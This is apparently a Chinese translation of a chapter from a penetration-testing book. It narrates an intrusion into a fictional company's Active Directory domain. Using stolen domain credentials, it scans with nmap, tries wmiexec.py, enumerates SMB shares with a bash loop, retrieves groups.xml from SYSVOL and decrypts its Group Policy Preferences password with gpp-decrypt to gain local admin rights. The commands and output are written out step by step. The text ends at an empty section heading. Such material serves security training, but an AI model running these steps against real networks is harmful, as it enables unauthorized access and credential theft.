# 领域神话

<b>
"你和上帝的唯一区别是你忘记了你是神圣的。"    --丹·布朗(Dan Brown) 
</b>

<br><br>


## 活动目录
为了正确地遵循场景的其余部分，对Windows活动目录有一个基本的了解是很重要的。这一小章通过显式地介绍一些关键的Active Directory概念来达到这样的目的。如果你觉得像是你已知的广告，你可以跳到下一章。

公司环境中的Windows计算机通常链接在一起，以便共享资源和设置。此互连是使用Windows活动目录设置的。

Windows活动目录的根节点称为林。其唯一目的是包含共享类似配置的域（计算机和用户组）。

每个域名跟踪自己的政策（“密码强度”、“更新时间表”、“用户帐户”、“机器”）。在我们的场景中，Gibsonbird定义了一个叫Gbshop.Corp的域名，在本地商店中操作服务器和计算机。

域控制器是控制和管理特定域的Windows计算机。它是资源从中进行决策或轮询新设置所依赖的中心枢纽。网络越大，用于提高性能的域控制器就越多。

在连接到域的Windows计算机上可以定义两种类型的用户：
- 本地用户的密码散列存储在本地服务器上
- 域用户的密码散列存储在域控制器上

因此，即使域用户没有附加在单个工作站中，仍可以连接到域中的所有工作站（除非禁止这样做）。

但是，要在服务器上远程打开会话，用户需要在所述服务器上具有远程桌面权限，或者需要管理员权限（本地或域上）。

用户可以是仅在给定计算机上定义的本地组的一部分，也可以是在域级别定义的域组的一部分，即在域控制器计算机上。

有三个主要的域组可以完全控制域及其所有资源：
- 域管理组
- 企业管理组
- 域管理员

如果我们控制一个属于其中一个组的帐户，它将自动检查和并与公司配对（有其他几种方法可以实现对域的完全控制：对GPO的写入权限、管理委派等。请查看Black Hat 2016上的精彩演示https://www.youtube.com/watch？v=2w1cesS7pGY）！

回到我们当前的情况，帐户dvoxon连接到域GBSHOP。他们使用的工作站也是如此，当然还有我们截获请求时他们正在联系的服务器。

既然我们在域名上有了一个合法的帐户，让我们四处看看，看看这片外国土地上有什么宝藏。

## 点击重播！
我们有一个用户的域密码。首先想到的是使用这些信息连接到他们的工作站并下载他们的文件和文件夹。要在Windows计算机上远程执行命令，我们至少需要以下三种网络条件之一：
- 远程桌面协议（RDP）-在计算机上打开3389端口。使用Windows上的mstsc或Linux上的rdesktop/remmina等程序，我们可以在机器上打开图形交互会话。这是方便远程连接的后续选项。
![](chap4/chap4-1.jpg)
- 远程过程调用（RPC）–端口135和49152-65535（或Windows 2003上的5000-6000）。这些是允许管理员在计算机上远程执行函数和过程的特殊服务，其中一些允许代码执行。
- 远程PowerShell（WinRM）–端口5985-5986。WinRM服务接受来自管理员用户的远程PowerShell命令。


如果我们回到前面执行的nmap扫描，我们可以在管理器的工作站上进行筛选：
```
root@PIspy:# grep "192.168.1.25" result_shop.gnmap 
Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///,
445/open/tcp//microsoft-ds///
```

RDP在机器上没有打开，这并不奇怪。它主要用于服务器。然而，135号端口是开放的！我们必须走老路：通过RPC执行命令行。使用图形界面（RDP）似乎是一个更简单的选择，但它确实有各种限制。

例如，一次只有一个用户可以打开交互式会话。我们必须耐心地等待Dvoxon去午休，然后才能尝试一种偷偷摸摸的连接。

另外，RDP连接有其专用的日志文件，因此调查人员更容易准确地查明漏洞的确切时间。结合各方因素，这也是更倾向选择RPC命令执行的原因。

我们将依赖Impacket框架(工具下载链接https://github.com/CoreSecurity/impacket)中名为wmiexec的工具在机器上获得交互式提示，并通过RPC执行简单的命令。
```
root@PIspy:# wmiexec.py dvoxon:Bird123\!@192.168.1.25
Impact v0.9.15 – Copyright 2002-2016 Core Security Technologies
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

凭据有效。但是，似乎dvoxon在计算机上没有足够的权限来远程执行命令。
要么是这个，要么是UAC的特性限制了我们的潜在范围。微软设置了UAC（用户访问控制）来限制通过RPC和WinRM执行远程命令的权限。因此，也许dvoxon确实是管理组的一部分，但是由于UAC的原因，我们不得不使用低特权上下文。

无论如何，我们会尝试另一条路。工作站上可能有网络共享吗？也许有一个文件夹里有很有价值的信息：
```
root@PIspy:# smbclient -L 192.168.1.25 -U GBSHOP\\dvoxon%Bird123!
Domain=[GBSHOP] OS=[Windows 10 Pro 14393] Server=[Windows 10 Pro 6.3]
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
```

好吧，也许这次不行。ADMIN$、C$和IPC$是管理员用户只能使用的默认共享（即远程共享）。基本上，我们有有效的域凭据，但受少数可能的目标限制…请稍候！

我们手头确实有其他候选人。还记得经理试图访问的服务器–SV0078吗？

让我们在那台机器上碰碰运气吧。实际上，让我们更大胆些。我们将瞄准所有可能的与SV0078一样托管在同一个网络的服务器。为此，我们首先将SV0078的NetBIOS名称解析为常规IP地址。
```
root@PIspy:# nmblookup SV0078
10.10.20.78 SV0078<00>
```

然后我们执行一个快速的nmap扫描，查找运行在同一网络上的机器（我们停留在/24段进行快速扫描）。

作为分支管理人员dvoxon对这些服务器中的任何一个拥有本地管理员权限，这不太可能，因此我们将只查找承载网络共享的服务器，即具有开放445端口的服务器：
```
root@PIspy:# nmap 10.10.20.0/24 -p 445 -oA 445_servers
Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-19
Nmap scan report for 10.10.20.78
PORT STATE SERVICE
445/tcp open microsoft-ds
Nmap scan report for 10.10.20.199
PORT STATE SERVICE
445/tcp open microsoft-ds
[…]
```

我们已将可能的目标列表缩小到少数几个提供文件共享服务（253台机器中有10台）。让我们使用bash中的脏循环爬行它们，该循环使用smbclient命令列出可用共享：<br>

```
# bash shell script file loop.sh
#!/bin/bash
## Array containing all viable targets
declare -a arr=("10.10.20.78" "10.10.20.199" "10.10.20.56" "10.10.20.41"
"10.10.20.25" "10.10.20.90" "10.10.20.71" "10.10.20.22" "10.10.20.38"
"10.10.20.15")
## now loop through the above array
for i in "${arr[@]}"
do
 echo $i
 ## List shares
 smbclient -L $i -U GBSHOP\\dvoxon%Bird123!
 echo "--"
done
```

```
root@PIspy:# chmod +x loop.sh && ./loop.sh
10.10.20.78
Domain=[GBSHOP] OS=[Windows Server 2012 R2 Datacenter Evaluation
9600] Server=[Windows Server 2012 R2 Datacenter Evaluation 6.3]
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
CORP$ Disk 
FTP_SALES$ Disk 
HR$ Disk 
IPC$ IPC Remote IPC
IT_Support$ Disk 
---
[…]
```

现在我们可以说，我确信您没有错过“FTP\SALES$”共享或其他吸引人的文件夹，但使用dvoxon的低权限帐户，我们无法访问它们（目前）：
```
root@PIspy:#smbclient -c "ls" //10.10.20.78/CORP$ -U GBSHOP\\dvoxon
%Bird123!
WARNING: The “syslog” option is deprecated
Domain[GBSHOP] OS=[Windows Server 2012 R2 Datacenter Evaluation
NT_STATUS_ACCESS_DENIED listing \*
```

我们需要一种获得更高特权的方法来摆脱这些令人讨厌的限制。实现这一点的一种方法是浏览dvoxon可用的有限共享，查找可能泄露某些密码的脚本和配置数据：.bat、.xml、.sh、.vbs、.vba、.vbe、.asp、.aspx、.php、.jsp等。

我们的第一个目标是承载SYSVOL共享的SV0199（10.10.20.199）计算机。不是随便挑的。这是域控制器上存在的典型文件夹。

我们有一个强大的目标在手！命令在smbclient中递归，并与ls指令一起显示所有可用目录中的文件：
```
root@PIspy:# smbclient -c "recurse;ls" //10.10.20.199/SYSVOL -U GBSHOP\\
dvoxon%Bird123!
```
![](chap4/chap4-2.jpg)

smbclient返回托管在此文件夹中的多个xml文件。域控制器依赖这些文件（groups.xml、ScheduledTasks.xml等）在域计算机上部署特定配置。

例如，这样一种有用的配置是在任何新工作站上设置本地管理用户。这通常是通过'groups.xml'文件完成的。

当然，每一个自动创建帐户都需要一个密码存储机制，还有什么比创建帐户所用的同一个文件groups.xml更好的地方来存储这些关键信息呢？groups.xml是一个必须由任何工作站（包括域用户）按设计读取的文件！

正如您在下面的屏幕中看到的，使用get命令，我们可以检索到名为wk_admin密码为“obfuscated”的本地管理帐户：
```
root@PIspy:# smbclient //10.10.20.199/SYSVOL -U GBSHOP\\dvoxon
%Bird123! -c "get \GBSHOP.CORP\Policies\{6AC1786C-016F-11D2-945F-
00C04fB984F9}\USER\Preferences\Groups\groups.xml"
```
![](chap4/chap4-3.jpg)

我们可以通过反转加密方案（AES-256）来恢复密码的明文版本，因为几年前微软无意中在其网站上发布了密钥：
![](chap4/chap4-4.jpg)

```
root@FrontGun:# gpp-decrypt
6gKTm/tvgxptRmOTeB4L1L6KcfLrPMwW8w6uvbqEvhyGbFtp6sSBueVYpTS+
ZcIU
7stringsRockHell*
```

答对了！(GPP解密在ARM版本的Kali上不可用。我们在前置服务器上解密密码)

现在我们有了一个有效的本地管理员帐户，我们终于可以在管理员的工作站上远程执行命令了。在一些罕见的情况下，UAC可能会让我们感到不安，但默认情况下，主本地管理员帐户不会受此影响。

使用wmiexec进行的快速测试证实，我们确实完全控制了工作站：
![](chap4/chap4-5.jpg)

## 帝国的拯救










> 翻译：Ryan 2020/2/19

